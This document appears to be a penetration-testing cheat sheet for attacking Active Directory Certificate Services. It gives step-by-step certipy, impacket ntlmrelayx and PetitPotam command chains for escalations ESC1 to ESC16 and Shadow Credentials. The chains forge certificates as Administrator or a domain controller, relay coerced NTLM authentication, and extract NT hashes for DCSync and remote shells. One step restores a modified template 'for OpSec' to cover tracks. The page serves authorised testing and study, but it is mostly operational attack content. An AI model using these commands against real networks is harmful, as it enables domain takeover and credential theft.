+++
title = "AD: ADCS Attack Reference"
+++

# ADCS Attack Reference

- https://specterops.io/blog/2022/06/13/certificates-and-pwnage-and-patches/
- https://github.com/ly4k/Certipy
- https://research.ifcr.dk/certipy-2-0-bloodhound-new-escalations-shadow-credentials-golden-certificates-and-more-34d1c26f0dc6

## Triage

```bash
certipy find -u <USER>@<DOMAIN> -p <PASS> -dc-ip <DC_IP> -vulnerable -enabled
```

**Read the output top-down: CA-level vulnerabilities appear under the CA block; template-level vulnerabilities appear under each template block.**

| `[!] Vulnerabilities:` value | Where in output | Key field to confirm |
| --- | --- | --- |
| `ESC1` | Template block | `Enrollee Supplies Subject: True` + `Client Authentication: True` |
| `ESC2` | Template block | `Extended Key Usage: Any Purpose` or empty EKU |
| `ESC3` | Template block | `Extended Key Usage: Certificate Request Agent` |
| `ESC4` | Template block | `Permissions` shows Write rights for low-priv principal |
| `ESC6` | CA block | `User Specified SAN: Enabled` (`EDITF_ATTRIBUTESUBJECTALTNAME2`) |
| `ESC7` | CA block | `Permissions` shows `ManageCA` or `ManageCertificates` for low-priv principal |
| `ESC8` | CA block | `Web Enrollment: Enabled` |
| `ESC16` | Template block | `No Security Extension: Enabled` on a template with Client Authentication EKU |

## ESC1: User-controllable SAN

- https://specterops.io/blog/2021/06/17/certified-pre-owned-abusing-active-directory-certificate-services/

**Signal:** Template block shows `Enrollee Supplies Subject: True` + `Client Authentication: True` + low-privilege principals in `Enrollment Rights`.

**Why it works:** When `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` is set, the requester controls the Subject Alternative Name (SAN) field. The DC resolves identity from the SAN UPN, not the requester's actual identity. PKINIT uses this SAN to issue a TGT for whoever is named — no password required.

```bash
# Request a cert for Administrator (supply their UPN in the SAN)
certipy req -u <USER>@<DOMAIN> -p <PASS> -dc-ip <DC_IP> \
  -target <TARGET_IP> -ca <CA_NAME> -template <TEMPLATE_NAME> \
  -upn administrator@<DOMAIN>

# Authenticate via PKINIT — outputs NT hash + saves TGT as administrator.ccache
certipy auth -pfx administrator.pfx -dc-ip <DC_IP>

export KRB5CCNAME=administrator.ccache
```

---

## ESC2: Any Purpose EKU

- https://specterops.io/blog/2021/06/17/certified-pre-owned-abusing-active-directory-certificate-services/

**Signal:** Template block shows `Extended Key Usage: Any Purpose` or no EKU at all, with low-privilege enrollment rights.

**Why it works:** Any Purpose EKU allows the certificate to satisfy any extended key usage check, including the Certificate Request Agent EKU used for enrollment agent operations. The CA does not enforce that enrollment agent certs carry the specific OID, so this cert can be misused to enroll on behalf of other users.

```bash
# Step 1 — Enroll using the Any Purpose template (produces <USER>.pfx)
certipy req -u <USER>@<DOMAIN> -p <PASS> -dc-ip <DC_IP> \
  -target <TARGET_IP> -ca <CA_NAME> -template <TEMPLATE_NAME>

# Step 2 — Use that cert as an enrollment agent to request on behalf of Administrator
certipy req -u <USER>@<DOMAIN> -p <PASS> -dc-ip <DC_IP> \
  -target <TARGET_IP> -ca <CA_NAME> -template User \
  -pfx <USER>.pfx -on-behalf-of '<DOMAIN>\Administrator'

# Authenticate
certipy auth -pfx administrator.pfx -dc-ip <DC_IP>
```

---

## ESC3: Enrollment Agent Abuse

- https://specterops.io/blog/2021/06/17/certified-pre-owned-abusing-active-directory-certificate-services/

**Signal:** Template block shows `Extended Key Usage: Certificate Request Agent` with low-privilege enrollment rights. Often paired with a second template that Enrollment Agents are authorized to enroll in.

**Why it works:** A Certificate Request Agent cert lets the holder enroll for certificates on behalf of any other user. AD CS trusts the agent cert and issues the resulting certificate in the target user's name, which can then be used for PKINIT authentication.

```bash
# Step 1 — Enroll to get the Enrollment Agent cert (produces <USER>.pfx)
certipy req -u <USER>@<DOMAIN> -p <PASS> -dc-ip <DC_IP> \
  -target <TARGET_IP> -ca <CA_NAME> -template <TEMPLATE_NAME>

# Step 2 — Use agent cert to enroll on behalf of Administrator
# -on-behalf-of format: NETBIOS_DOMAIN\username (short domain name, not FQDN)
certipy req -u <USER>@<DOMAIN> -p <PASS> -dc-ip <DC_IP> \
  -target <TARGET_IP> -ca <CA_NAME> -template User \
  -pfx <USER>.pfx -on-behalf-of '<DOMAIN>\Administrator'

# Authenticate
certipy auth -pfx administrator.pfx -dc-ip <DC_IP>
```

**NOTE:** `-on-behalf-of` takes the NetBIOS domain name (`CORP\Administrator`), not the FQDN. The second template (`User` here) must be one that Enrollment Agents are authorized to use.

---

## ESC4: Vulnerable Template ACL

- https://specterops.io/blog/2021/06/17/certified-pre-owned-abusing-active-directory-certificate-services/

**Signal:** Template block `Permissions` shows `WriteDacl`, `WriteOwner`, or `WriteProperty` rights for a low-privilege principal on the template object.

**Why it works:** Write access to the template AD object lets you modify its properties — specifically enabling `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` and adding low-privilege enrollment rights, converting the template into an ESC1-vulnerable state.

```bash
# Step 1 — Back up original template config (produces <TEMPLATE_NAME>.json)
certipy template -u <USER>@<DOMAIN> -p <PASS> -dc-ip <DC_IP> \
  -template <TEMPLATE_NAME> -save-old

# Step 2 — Overwrite template with ESC1-vulnerable configuration
certipy template -u <USER>@<DOMAIN> -p <PASS> -dc-ip <DC_IP> \
  -template <TEMPLATE_NAME> -write-default-configuration

# Step 3 — Exploit as ESC1
certipy req -u <USER>@<DOMAIN> -p <PASS> -dc-ip <DC_IP> \
  -target <TARGET_IP> -ca <CA_NAME> -template <TEMPLATE_NAME> \
  -upn administrator@<DOMAIN>

# Step 4 — Restore original template (OpSec)
certipy template -u <USER>@<DOMAIN> -p <PASS> -dc-ip <DC_IP> \
  -template <TEMPLATE_NAME> -write-configuration <TEMPLATE_NAME>.json

# Authenticate
certipy auth -pfx administrator.pfx -dc-ip <DC_IP>
```

---

## ESC6: EDITF_ATTRIBUTESUBJECTALTNAME2

- https://specterops.io/blog/2021/06/17/certified-pre-owned-abusing-active-directory-certificate-services/

**Signal:** CA block shows `User Specified SAN: Enabled`. CA-level flag — applies to all templates on that CA.

**Why it works:** `EDITF_ATTRIBUTESUBJECTALTNAME2` tells the CA to honor the SAN field from the requester on any certificate request, regardless of whether the template enables `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`. Any template with Client Authentication EKU and low-privilege enrollment rights becomes exploitable.

```bash
# Any Client Authentication template works — not just explicitly vulnerable ones
certipy req -u <USER>@<DOMAIN> -p <PASS> -dc-ip <DC_IP> \
  -target <TARGET_IP> -ca <CA_NAME> -template User \
  -upn administrator@<DOMAIN>

certipy auth -pfx administrator.pfx -dc-ip <DC_IP>
```

---

## ESC7: Vulnerable CA ACL

- https://specterops.io/blog/2021/06/17/certified-pre-owned-abusing-active-directory-certificate-services/
- https://research.ifcr.dk/certipy-2-0-bloodhound-new-escalations-shadow-credentials-golden-certificates-and-more-34d1c26f0dc6

**Signal:** CA block `Permissions` shows `ManageCA` or `ManageCertificates` for a low-privilege principal.

**Why it works:** `ManageCertificates` (Officer role) lets you approve denied certificate requests. `ManageCA` lets you grant yourself the Officer role. The SubCA template allows specifying a SAN but always denies low-privilege requests — an Officer can force-issue that denied request and then retrieve it.

```bash
# Step 1 — Grant yourself the Officer role (requires ManageCA)
certipy ca -u <USER>@<DOMAIN> -p <PASS> -dc-ip <DC_IP> \
  -target <TARGET_IP> -ca <CA_NAME> -add-officer <USER>

# Step 2 — Enable SubCA template on the CA
certipy ca -u <USER>@<DOMAIN> -p <PASS> -dc-ip <DC_IP> \
  -target <TARGET_IP> -ca <CA_NAME> -enable-template SubCA

# Step 3 — Request as Administrator; will be DENIED. Note the Request ID in output.
certipy req -u <USER>@<DOMAIN> -p <PASS> -dc-ip <DC_IP> \
  -target <TARGET_IP> -ca <CA_NAME> -template SubCA \
  -upn administrator@<DOMAIN>

# Step 4 — Force-issue the denied request using Officer rights
certipy ca -u <USER>@<DOMAIN> -p <PASS> -dc-ip <DC_IP> \
  -target <TARGET_IP> -ca <CA_NAME> -issue-request <REQUEST_ID>

# Step 5 — Retrieve the issued certificate
certipy req -u <USER>@<DOMAIN> -p <PASS> -dc-ip <DC_IP> \
  -target <TARGET_IP> -ca <CA_NAME> -retrieve <REQUEST_ID>

# Authenticate
certipy auth -pfx administrator.pfx -dc-ip <DC_IP>
```

**NOTE:** If you only have `ManageCertificates` (not `ManageCA`), skip Step 1. If you only have `ManageCA`, run Step 1 first to grant yourself `ManageCertificates`, then proceed.

---

## ESC8: NTLM Relay to HTTP Enrollment

- https://specterops.io/blog/2021/06/17/certified-pre-owned-abusing-active-directory-certificate-services/
- https://research.ifcr.dk/certipy-2-0-bloodhound-new-escalations-shadow-credentials-golden-certificates-and-more-34d1c26f0dc6

**Signal:** CA block shows `Web Enrollment: Enabled`. The endpoint `http://<CA_NAME>/certsrv/` is accessible over HTTP, not HTTPS.

**Why it works:** The ADCS Web Enrollment endpoint (`/certsrv/certfnsh.asp`) accepts NTLM authentication over HTTP. HTTP NTLM is relay-able because Extended Protection for Authentication (EPA / channel binding) is not enforced by default on HTTP — only on HTTPS. Coercing a DC's machine account to authenticate to the attacker and relaying those credentials to the CA yields a DC certificate, which enables PKINIT as the DC and leads to DCSync.

```bash
# Terminal 1 — Relay NTLM to the Web Enrollment endpoint, request DC cert
sudo impacket-ntlmrelayx --smb2support --adcs \
  -t http://<TARGET_IP>/certsrv/certfnsh.asp

# Terminal 2 — Coerce DC machine account auth to attacker (unauthenticated PetitPotam)
python3 PetitPotam.py -u '' -p '' <ATTACKER_IP> <DC_IP>

# Authenticated coercion if unauthenticated path is patched
python3 PetitPotam.py -u <USER> -p <PASS> -d <DOMAIN> <ATTACKER_IP> <DC_IP>
```

ntlmrelayx outputs a base64-encoded certificate. Decode and authenticate:

```bash
echo '<BASE64_BLOB>' | base64 -d > dc.pfx

# Authenticate as DC machine account — outputs NT hash, saves TGT
certipy auth -pfx dc.pfx -dc-ip <DC_IP>

# DCSync using NT hash
impacket-secretsdump -hashes :<NT_HASH> '<DOMAIN>/DC$@<DC_IP>'
```

---

## Shadow Credentials

Requires `GenericWrite` or `AddKeyCredentialLink` on the target account. Writes a Key Credential to the target's `msDS-KeyCredentialLink` attribute, then uses PKINIT to authenticate and retrieve the NT hash. Does not modify the password.

```bash
# Shadow credential attack -- write key credential to target user, get their NT hash
certipy shadow auto -u <USER> -p '<PASSWORD>' -dc-ip <DC_IP> -account <TARGET_USER>
```

---

## ESC16: UPN Impersonation

**Signal:** Template block shows `No Security Extension: Enabled` on a template with Client Authentication EKU.

**Why it works:** When the `szOID_NTDS_CA_SECURITY_EXT` extension is absent from a template, the issued certificate does not bind to the requester's SID. The DC resolves the identity from the UPN in the certificate instead. By temporarily changing the target's UPN to match a privileged user, you can request a certificate that authenticates as that privileged user.

**Prereqs:** Write access to the target account's `userPrincipalName` attribute (`GenericWrite`, `GenericAll`, or `WriteProperty`). Combine with Shadow Credentials to get the NT hash needed for authentication.

```bash
# Enumerate ADCS for vulnerable templates and CAs
certipy find -u <USER>@<DC_IP> -hashes <NT_HASH> -vulnerable -stdout

# Read target account's AD attributes (UPN, SPN, etc.)
certipy account -u <USER>@<DC_IP> -hashes <NT_HASH> -user <TARGET_USER> read

# ESC16 -- change target's UPN to impersonate another user (e.g. administrator)
certipy account -u <USER>@<DC_IP> -hashes <NT_HASH> -user <TARGET_USER> -upn <IMPERSONATE_USER> update

# Request certificate as the impersonated user
certipy req -u <TARGET_USER> -hashes <NT_HASH> -dc-ip <DC_IP> -dns <DC_IP> -target <DC_FQDN> -ca <CA_NAME> -template User

# Revert UPN back to original after certificate is issued
certipy account -u <USER>@<DC_IP> -hashes <NT_HASH> -user <TARGET_USER> -upn <TARGET_USER>@<DOMAIN> update

# Authenticate with the certificate -- extract TGT and NT hash
certipy auth -dc-ip <DC_IP> -pfx <PFX_FILE> -u <IMPERSONATE_USER> -domain <DOMAIN>
```

---

## Decision Tree

| certipy find shows | ESC | First move |
| --- | --- | --- |
| Template: `Enrollee Supplies Subject: True` + `Client Authentication: True` + low-priv enrollment | ESC1 | `certipy req ... -template <TEMPLATE_NAME> -upn administrator@<DOMAIN>` |
| Template: `Extended Key Usage: Any Purpose` (or empty) + low-priv enrollment | ESC2 | Enroll → use resulting cert with `-pfx` + `-on-behalf-of '<DOMAIN>\Administrator'` |
| Template: `Extended Key Usage: Certificate Request Agent` + low-priv enrollment | ESC3 | Enroll for agent cert → `req ... -pfx <agent.pfx> -on-behalf-of '<DOMAIN>\Administrator'` |
| Template: `WriteDacl`/`WriteOwner`/`WriteProperty` for low-priv principal | ESC4 | `certipy template ... -write-default-configuration` → ESC1 chain |
| CA: `User Specified SAN: Enabled` | ESC6 | `certipy req ... -template User -upn administrator@<DOMAIN>` |
| CA: `ManageCA` or `ManageCertificates` for low-priv principal | ESC7 | `certipy ca ... -add-officer <USER>` → SubCA deny → force-issue → retrieve |
| CA: `Web Enrollment: Enabled` (HTTP) | ESC8 | `ntlmrelayx --adcs -t http://<TARGET_IP>/certsrv/certfnsh.asp` → coerce DC |
| Template: `No Security Extension: Enabled` + Client Auth EKU | ESC16 | Shadow Creds → get NT hash → change UPN → `certipy req` → revert UPN → `certipy auth` |

**All ESC paths converge here:**
```bash
certipy auth -pfx administrator.pfx -dc-ip <DC_IP>
# NT hash → evil-winrm -H <NT_HASH> / impacket-secretsdump / psexec
```

---
